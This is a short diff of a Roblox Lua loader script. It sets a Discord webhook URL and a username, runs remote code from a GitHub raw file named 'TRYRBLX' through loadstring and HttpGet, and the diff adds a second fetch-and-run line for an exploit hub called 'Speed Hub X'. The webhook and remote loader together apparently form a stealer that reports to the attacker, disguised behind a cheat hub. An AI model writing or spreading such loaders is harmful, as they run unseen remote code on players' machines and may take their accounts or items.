@@ -2,3 +2,4 @@ getgenv().Webhook = "https://discord.com/api/webhooks/1434976186999509063/jjItn5
 getgenv().Username = "GHOSS23"
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/kevin52772/AhmadV99/refs/heads/main/TRYRBLX"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/AhmadV99/Speed-Hub-X/main/Speed%20Hub%20X.lua", true))()
